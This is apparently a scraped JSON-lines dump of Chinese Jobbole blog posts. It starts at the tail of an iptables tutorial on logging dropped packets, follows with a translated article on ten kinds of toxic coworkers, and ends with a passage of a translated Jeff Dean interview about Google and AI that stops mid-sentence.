-j ACCEPT</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3># 25. 为丢弃的包做日志（Log）</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21c976cf9180336410\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\niptables -N LOGGING\r\niptables -A INPUT -j LOGGING\r\niptables -A LOGGING -m limit --limit 2/min -j LOG --log-prefix \"IPTables Packet Dropped: \" --log-level 7\r\niptables -A LOGGING -j DROP</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21c976cf9180336410-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cf9180336410-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b21c976cf9180336410-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21c976cf9180336410-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21c976cf9180336410-1\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">N</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">LOGGING</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cf9180336410-2\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">INPUT</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">LOGGING</span></div><div class=\"crayon-line\" id=\"crayon-594b21c976cf9180336410-3\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LOGGING</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">limit</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">limit</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">min</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LOG</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">prefix</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"IPTables Packet Dropped: \"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">log</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">level</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21c976cf9180336410-4\"><span class=\"crayon-v\">iptables</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">A</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">LOGGING</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">j</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">DROP</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"108468\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"108468votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"108468\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 9 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/aoi\">伯小乐</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/aoi\">\r\n\t\t\t<img src=\"http://www.jobbole.com/wp-content/uploads/2015/11/f2bb4f6f428a49476a2e91c355c8d150.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            伯乐在线小编一枚~~~~PS：我不是@小编辑，不要问我了        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/aoi\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/aoi/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/aoi/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 245</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/12/86e7a2063176621434fa881157f4a5b7.jpg"], "fav_nums": 9, "comment_nums": 2, "create_date": "2017/04/25", "praise_nums": 2}
{"tags": " 1 评论 ,职场", "front_image_path": "full/0c6dbe22d880d54f3be08f501152139efceb068d.jpg", "title": "不惜一切代价，远离这 10 种不靠谱的同事", "url_object_id": "fcc55cfc355c49b6ffb8d3656c8ec23c", "url": "http://blog.jobbole.com/111020/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/young605867996\">Lada</a> 翻译，<a href=\"http://www.jobbole.com/members/huanglimin\">黄利民</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://www.inc.com/travis-bradberry/10-toxic-people-you-should-avoid-at-all-costs.html\">Travis Bradberry</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【导读】：本文讲述了工作中的 10 种不靠谱的同事，以及如何保护自己并避免跟他们接触。</p>\n<p>有毒之人（Toxic People）不讲逻辑。他们中一些人不知道自己对周围人的负面影响，另一些人似乎以制造混乱和惹怒别人取乐。</p>\n<p>（伯小乐补充：英文中的 Toxic People，中文暂无统一的译法，不同语境下有不同的意思。总体而言，是那种有着负面情绪，传递负能量，影响他人心情的人。私以为，这些都不如直译为「有毒之人」）</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx2.sinaimg.cn/large/63918611gy1ff14nuanmpj20i20c2753.jpg\"></p>\n<p>学习如何与三教九流打交道很重要，与此同样重要的是识别有毒之人，他们完全不值得你浪费时间和精力。他们制造不必要的复杂、冲突，最糟糕的是，制造压力。</p>\n<blockquote><p>“他人会鼓舞你，或是消耗你，要明智选择” —— Hans F. Hansen</p></blockquote>\n<p>德国席勒大学的最近研究正好展示了这一问题的严重性。他们发现，受到造成强烈负面情绪的刺激（和你在与有毒之人相处时遭受的一样），会引起研究对象大脑压力的巨大反应。</p>\n<p>长期研究表明，压力会对大脑造成持久的负面影响。即使遭受几天的压力，海马体神经元的有效性就会大打折扣，而海马体是大脑负责推理和记忆的重要区域；几周的压力，会对脑细胞造成可逆性损伤；上月的压力，会对脑细胞造成永久性伤害。由此可见，有毒之人不止让你痛苦，更是真正伤害你的大脑。</p>\n<p>控制情绪的能力和在压力下保持冷静的能力，与你的表现直接相关。TalentSmart 主导过一次上百万人参与的研究，发现 90% 的顶级演员（performer）擅长在压力下管理情绪，以保持冷静和自我控制。他们最好的天赋之一，就是有能力识别带有毒之人，并且与之保持距离。</p>\n<p>常言道，近朱者赤，近墨者黑。英文中也有句这样的话，和你相处时间最多的 5 个人，你是他们的产物。在这 5 个人中，有一个是带有负面情绪的，很快你就会发现他或她让你停滞不前的能力。</p>\n<p>但你不能期望自己远离有毒之人，除非你首先知道他们是谁。诀窍就是把讨厌的人，或者只是不随和的人与那些真正有毒之人区分开。以下 10 种有毒之人，你应该不惜一切代价地远离，以便你自己不会成为其中一种。</p>\n<h3>1.八卦者（The Gossip）</h3>\n<blockquote><p>“上智论道，中智论事，下智论人。”——Eleanor Roosevelt（美国第 32 任总统富兰克林·德拉诺·罗斯福的妻子）</p></blockquote>\n<p>爱八卦的人喜欢从他人的不幸中获得快乐。窥视别人私下或职场的失态，一开始可能是有趣的。但时间久了令人厌烦恶心，并且伤害别人。在浪费时间谈论别人的不幸之外，有太多的积极面和太多能向有趣之人学习的了。</p>\n<h3>2.喜怒无常的人（The Temperamental）</h3>\n<p>有些人完全不控制自己的情绪。他们会猛烈抨击你，把他们的感受附加给你，始终认为是你引起了他们的不适。你很难在你的生活里把喜怒无常的人抛弃，因为他们无法掌控自己的情绪，让你对他们感到难过。喜怒无常的人在事态严重时，把你当作情感厕所，你应该不惜代价去避免。</p>\n<h3>3. 受害者（The Victim）</h3>\n<p>受害者很难确定，因为你最初会同情他们面临的问题。但时间久了，你开始意识到他们总是处在“危急时刻”。受害者会积极地推卸所有的个人责任，在每一次遇见难以跨越的大山时都会减速。他们不认为艰难时期是学习和成长的机会；相反，他们把自己视为出局者。有句老话：“痛苦难以避免，但是否承受可以选择。”这完全抓住了受害者的德性，他们每次都选择忍受。</p>\n<h3>4.自私鬼（The Self-Absorbed）</h3>\n<p>自私的人，与别人保持着冷漠的距离。当你徘徊在他们身边时，你会常常讲话，因为你开始感到彻底地孤独。发生这些是由于在他们看来，和他人之间的真正联系毫无疑义。你只是一个他们建立自尊心的工具。</p>\n<h3>5. 嫉妒者（The Envious）</h3>\n<p>嫉妒者总是“这山望着那山高”。即使他们遇到好事，也不能从中获得任何满足感。这是因为，当他们应该从自身获得满足的时候，却对着世界的财富衡量自己的财富。面对现实吧，如果你仔细观察，总会有比你做得更好的人。花太多时间在嫉妒者身上比较危险，因为他们教会你弱化自己的成就。</p>\n<h3>6.操纵者（The Manipulator）</h3>\n<p>在友谊的表象下，操纵者吸走你的时间和精力。他们很难对付，因为他们对待你仿佛你是一个朋友。他们知道你喜欢什么、什么使你快乐、你认为什么有趣，但不同的是，他们把这些信息当做另有所图的部分。操纵者总想从你那获得什么，如果你回顾与他们的关系，都是你在给予，他们几乎没有什么都不给。他们会做所有能说服你的事，这样他们就可以操纵你了。</p>\n<h3>7.摄魂怪（The Dementor）</h3>\n<p>在 J·K·罗琳的《哈利波特》系列中，摄魂怪是从人类身体吸走灵魂，只留下一具空壳的邪恶生物。无论何时，摄魂怪进入房间，屋内就会变暗，人会感到寒冷，开始回忆起最糟糕的记忆。罗琳说她创作摄魂怪的想法取自高度消极的人——那种有能力走进一个房间，立刻吸走所有生命的人。</p>\n<p>摄魂怪通过每个人遇到的消极和悲观，吸取房间里所有人的生命。他们的观点总是悲观主义的，甚至可以在最良好的情况下注入恐惧和担忧。Notre Dame 大学的一项研究发现，分配到消极室友的学生，更容易产生消极的想法，甚至抑郁。</p>\n<h3>8.扭曲者（The Twisted）</h3>\n<p>有些有毒之人有着不良意图，在别人的痛苦和苦难中获得极大的满足。他们要么出手伤害你，让你感觉糟糕，要么从你那得到什么；否则，他们对你毫无兴趣。这类人的唯一好处是，你能很快地发现他们的意图，这更容易让他们快速地离开你的生活。</p>\n<h3>9.审判者（The Judgmental）</h3>\n<p>审判者会很快告诉你到底什么酷、什么不酷。他们有办法拿走你最热爱的东西，并让你感觉在乎这件事是很糟的。审判者看不起别人，而不是欣赏或学习与他们不同的人。审判者会扼杀你充满激情、善于表达的愿望，所以你最好切断与他们的联系，做好自己。</p>\n<h3>10.自大狂（The Arrogant）</h3>\n<p>自大狂会浪费你的时间，因为他们把你做的每件事都视为个人挑战。自大是虚假的自信，它总是掩饰着极大的不安。阿克伦大学的一项研究发现，傲慢与工作场所中的一系列问题密切相关。自大狂倾向于成为低级的表演者，更坏脾气，比普通人有更多的认知问题。</p>\n<h3>如何保护自己？</h3>\n<p>有毒之人会把你逼疯，因为他们的行为非常不合理。别搞错了他们行为反常的原因，但你何必让自己应对他们情绪化，并卷入混乱呢?</p>\n<p>一个人越是不理性、越是大错特错，对你来说就应该更容易地逃离他（她）的套路。放弃在他们的游戏中打败他们。远离他们的情绪化，把与他们的交往当做一个科学项目（或者把自己作为他们的精神科医生，如果你喜欢这个类比的话）。你不需要应对他们的情绪混乱，而是只应对事实。</p>\n<p>保持感情距离需要形成意识。如果你不能在事情发生的时候意识到，你就没法阻止别人惹怒你。有时你会发现自己处于需要重新部署的情况，那就要选择最优的出路。这没什么，你不该害怕花时间去做这个。</p>\n<p>大多数人觉得，因为和这样的人一起工作或生活，所以没有办法控制这样的混乱。这样的想法不可取。一旦你辨认出有毒之人，你就会发现他们的行为更容易预测、更容易理解了。这会让你理性地思考，什么时候你不得不容忍他们、什么时候你不用容忍。你可以建立界限，但你必须自觉和主动的去建立。如果你让事情就那样发生，你必然会发现自己经常陷入艰难的对话。但如果你设定界限，并决定何时何地你与难相处的人交往，你就可以 hold 住大多数的混乱。唯一的技巧是保持警惕，并在他们试图越界时守住界限，他们会试图这样做的。</p>\n<p>你有没有撞见这几类有毒之人？请在评论中分享你的经历。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111020\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111020votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111020\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/young605867996\">Lada</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/young605867996\">\r\n\t\t\t<img src=\"http://q.qlogo.cn/qqapp/208656/B77EEB9D520DE9C7BD42E89DC348FEC7/100\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            希望了解更多互联网、创业管理、创新思维、前沿技术和设计的知识。渐进明细，持续改进。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/young605867996\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/young605867996/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/young605867996/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 11</a> · <a title=\"我的网站\" target=\"_blank\" href=\"http://littlejanery.blog.163.com/\"><i class=\"fa fa-link\"></i></a> <a title=\"QQ：605867996\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a> <a title=\"个人微信：yao605867996\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx2.sinaimg.cn/large/63918611gy1ff14nuanmpj20i20c2753.jpg"], "fav_nums": 2, "comment_nums": 1, "create_date": "2017/04/27", "praise_nums": 2}
{"tags": "Jeff Dean,人工智能,访谈,机器学习,Google", "front_image_path": "full/d8fd82e27bfcfd9fa3f580ce90a51f7f874011e6.jpg", "title": "谷歌人工智能背后的大脑", "url_object_id": "3a30df55e5c3c78da5ee376f5e6cc4a9", "url": "http://blog.jobbole.com/110925/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/paradise_FD\">郑芸</a> 翻译，<a href=\"http://www.jobbole.com/members/huanglimin\">黄利民</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://www.forbes.com/sites/peterhigh/2016/08/01/a-tour-inside-googles-brain/#4401149b25bf\">Peter High</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【伯乐在线导读】：1996 年 Jeff Dean 在华盛顿大学获得计算机科学博士学位，三年后便加入了谷歌。谷歌在 1998 年成立，他是公司早期员工之一。Jeff Dean 在谷歌公司的成长过程中扮演了重要角色，设计并实现了支撑谷歌大部分产品的分布式计算基础架构。2016 年 8 月 Forbes 的 Peter High 对 Jeff Dean 做了一次采访，伯乐在线编译如下。</p>\n<p>谷歌 CEO Sundar Pichai 曾说谷歌将主要成为一家人工智能公司，作为系统和基础架构小组的资深前辈，Dean 和他的团队对于实现这个计划来说至关重要。这次的采访所涵盖的内容比较广泛，Dean 描述了他在谷歌扮演的多样角色，公司的 AI 愿景以及他对于谷歌即使已成为科技巨头但仍保持着创业精神的看法，同时还包括其他各种各样的话题。</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1feqvu2gi3dj21jk111top.jpg\" width=\"690\" height=\"460\"></p>\n<p>Peter High：你好，Jeff Dean，你参与了谷歌大部分的历史，在 1999 年就加入了公司。请简单描述下这十几年来你在公司的角色是如何演变的。</p>\n<p>Jeff Dean：我刚加入时公司真的很小，我们一起挤在帕罗奥图市大学路的一间小办公室里。我做的第一件最主要的事情就是创建我们第一个广告系统。之后，我花费了4到5年的时间在用于每一次查询的抓取、索引和搜索系统。之后，我主要与同事 Sanjay Ghemawat 等人创建用于存储和处理大规模数据设置的软件基础架构，还做一些像搜索指数或者处理卫星图像这样的事情。最近，我致力于机器学习系统。</p>\n<p> </p>\n<p>High：你在公司的权限有多大，你要做的工作范围有多广？我猜想你没有“普通的一天”。你如何与公司内部或者外部的人员互动？在当前的工作上，你如何把时间分配在这些不同的事情呢？</p>\n<p>Dean： 真不是典型的工作日 。<span style=\"color: #ff0000;\">在最初的 14 到15 年，我没有接受任何管理性的职位，这给了我更多自由时间去集中精力写代码</span>。在最近几年，我接受了一些机器学习方面的管理职位，这对我来说很有趣，也是新的学习经历。因为在公司历史上我从事过多种工作，我会保持跟进这些不同的项目，我收到很多邮件。我花费相当一部分时间去处理邮件，通过浏览邮件来跟进项目的最新进展。在任何特定的时间，我手上都有几个技术性项目，我努力分配出时间在这些项目上面，同时还穿插着各种会议和设计审查各种事情。</p>\n<p> </p>\n<p>High：尽管谷歌已经取得了巨大的发展，它仍然是保持创新的典范。它保持着壮志雄心和开拓创新，仿佛它只是一个很小的组织一般。但是它已有了资源——不管是人才上还是资金上——俨然已是科技界的庞然大物。这个组织是如何对抗停滞和官僚主义，从而保持不拘于自身规模的更强的灵活性呢？</p>\n<p>Dean： 自从我加入公司以来，我们基本就经历了公司的不断成长。在早期，我们新招聘的员工每年都会增长一倍。按新员工占总员工的百分比算，我们后来降低了这个比例，但是在绝对数量上，我们基本仍保持一个大的增长，现在大约每年招聘 10% 到 20% 的新员工。公司规模每扩大一倍，我们就被迫使去重新思考公司已经完成的这些事情。哪些过去适用于 X 倍规模，但却不再适用于 2X 倍规模，我们必须去努力使我们的模式、工程、组织结构、团队动力等适应新的规模。</p>\n<p>我认为有助于我们成长的一个举动是，把与谷歌其他业务在一定程度相分离的部分独立出来，成立不同的部门。创建为偏远地区覆盖网络的高海拔气球，与服务搜索查询有相对适度的互动。大体上把各种不同的活跃的项目独立开来，我们能获取更好的规模和效率，这些项目是我们的核心业务，但是彼此不需要太多的沟通交流。</p>\n<p> </p>\n<p>High：我理解 Google/Alphabet 各部门的分离，是出于想要维持一定的灵活性，和划分开不同的活动的逻辑。这个评价是否公允？</p>\n<p>Dean： 是的。我认为这使得 Alphabet 下面一些其他实体可以更独立地操作。关于规模的成倍增长，有一个有趣的转变是：以前我们每个人都是在同一个大楼，现在每个人都不在同一个大楼。</p>\n<p>另一个转变，以前员工只在山景城，后来在瑞士苏黎世、纽约、日本东京和西雅图都设有办事处。我们一度有 5 个办事处，都相当大而完善。然后在短短几年内，我们的办事处从 5 个扩张到 35 个，因为我们觉得在世界各地设有许多办事处很好，在哪里可以找到有才华的人才，就在他们身边设立一个办事处。这促使我们不得不重新思考，如何去组织我们工程师的诸多成果。如果你有一个小的办公室，他们可能不应该做一百件事；他们应该做少数几件事，并专心把他们做好。一些小办公室采取的模式是看山景城的人在做什么，他们看到他们在做一百件事，所以他们认为他们也应该做一百件事。我们慢慢摸索到有一种更好的方式来充分发挥这些散布在各地的工程办事处的人的能力。</p>\n<p> </p>\n<p>High：谷歌 CEO Sundar Pichai 曾说，从长远来看，设备装置将会消失，计算将从移动设备优先向人工智能优先进化。你如何看待谷歌对于人工智能优先的愿景？</p>\n<p>Dean：我认为我们已经从桌面计算进入到了移动计算，这时候每个人都有一个计算设备随身随时携带。随着设备不断地缩小，语音识别和其他可用的 UI 变得实际可用，这将改变我们与计算设备交流的方式。他们将会退居到幕后或者只是周边，允许我们与他们对话就像我们与其他可信赖的伙伴对话一样。他们将会帮助我们获取我们需要的信息和完成各种任务。我认为这是推动机器学习的一个主要目标：在提供咨询方面让计算机提供其他人类伙伴能够提供的智慧，期待必要的时候有更多的信息和更多这类的事情。我认为在下个 5 到 10 年，将会是一个激动人心的时期。</p>\n<p> </p>\n<p>High：随着各种进步和各种关于 AI 的目标的实现，看起来很多人不再谈论那些已经实现的真正的 AI。那就是，AI 在被谈论时似乎总是带有未来色彩。你怎么定义 AI 的边界？</p>\n<p>Dean：我认为真正的通用人工智能将是一个系统，能够执行人类水平的推理，理解和完成复杂的任务。我们显然还没有达到这个水平，但你说得很对，确实有了很多进展。5 年前，给计算机一张图片，它还不能生成一个人类水平的句子来描述这个图片。现在，计算机生成的句子会说，“这张图片描述的是一个男人拿着网球拍在网球场上。”同时，一个人可能会说，“这是一张网球运动员发球的图片。”人的描述更为微妙，但事实上，现在计算机能够生成看起来几乎是人类写的标题，这是一个相当大的进步。这只是过去的 5~6 年间已实现的众多更具智慧的机器学习模型中的其中一个成就。随着他们应用更大的数据和计算，结果会更好。</p>\n<p> </p>\n<p>High：你认为我们距离通用人工智能还有多远？</p>\n<p>Dean：不同的问法有不同的回答，这个问题有点广泛。我只敢给出一个宽泛的猜测。大约就是 15 到 50 年，也有可能比 15 年更早。</p>\n<p> </p>\n<p>High：正如你所提到的，语言是关键，许多谷歌的人工智能都围绕着语言、阅读和理解网页上的一切或从事智能对话和理解背景。你能谈谈能使得机器更好的解释事物的路径吗？你预见的事情，以及你从事的事情正朝什么方向进展，如果还没完全达到全面的通用人工智能的话？</p>\n<p>Dean：我认为有趣的事之一是信息检索领域，这基本上就是谷歌早期做的工作。传统上，它并不试图真正理解用户在查询时需要什么。它更多的是关于查找包含或者接近这个单词的文档。有趣的是，在过去的四五年，我们已经开始发展出这样一种技术，可以更好地理解“car”这个单词的本质。知道 “car” 和 “cars”、 “automobile”、“passenger car”、“pickup truck” 在某种意义上都是相关联的，能够以更顺畅的方式匹配出文章，在许多语言理解任务上可以得出更好的结果。</p>\n<p>我们能理解的不仅仅是单词，我们的理解还能达到这个水平，即理解在阐释上不同但意思相同的两个句子。这开始促使我们的语言理解达到这样一个层次：以更机器学习的方式理解更长得多的序列文本。</p>\n<p>接下来几年我们有个目标，希望能够采集数以百计数以千计的文件，然后对这些文件内容展开一个对话。也许系统会自动总结这些文件，提问或者回答关于文件内容的问题。我认为这种水平的理解，是我们将真正去实现的高水平的语言理解。</p>\n<p> </p>\n<p>High：似乎你和你们团队的成果已经开始应用在谷歌的各种产品当中：谷歌助手，谷歌新的对话虚拟助手；与 Amazon Echo 相竞争的 Google Home；以及为谷歌服务提供对话界面的信息 APP——Allo。你怎么看待谷歌最近的产品和服务？</p>\n<p>Dean：<b><b><b> </b></b></b>我目前领导的研究小组被称为谷歌大脑（Google Brain）。我们专注于建立大规模计算系统来实现机器学习，和做前沿的机器学习研究。只有机器学习技能或只有大规模计算技能的人才，往往不能完全发挥他们的才能，而同时拥有这两种不同技能的人才在一起工作，合作解决问题，通常会产生出意义重大的进步。我想这就是我们团队在这两个领域，在关于我们在这些难题上投入达到世界先进水平的计算力，以及我们怎样训练大有力的模型在我们关心的问题上都取得很大成功的原因之一。</p>\n<p>通过理解我们的一些研究成果什么时候可以用于提升谷歌现有产品上，我们以往在长期研究上是相当机会主义的。我们与产品团队一起合作说，“嘿，我们认为这个机器学习研究将会非常有用。”有时这是需要放手去做的事情。其他时候我们小组和产品团队深度合作，让研究结果变成真实产品。</p>\n<p>我们小组的研究人员曾发明了一种叫“从序列到序列学习（sequence-to-sequence learning）”的模型。这其中的理念是，你使用一个输入序列来预测某些输出结果序列。听起来有点抽象，但可以映射到许多你想要解决的真正问题。他们发表的研究论文最初是在语言翻译的背景下。输入序列可以是一个句子中的英文单词，一次一个。该模型被训练去输出对应的法国单词来创建一个法语句子，意思与输入的英语句子相同。这不同于其他机器翻译系统，别的机器翻译系统往往是问题的代码和子件——也许使用了机器学习或统计模型，然后将它拼接在一起。相比与那个方法，这个系统是一个完全的机器学习，端到端系统，在这个系统中你用语言不同但表达的意思相同的成对的句子作为数据来训练，然后系统就能学会将一种语言翻译另一种语言。</p>\n<p>在其他语境中，这种通用模型非常有用。Gmail 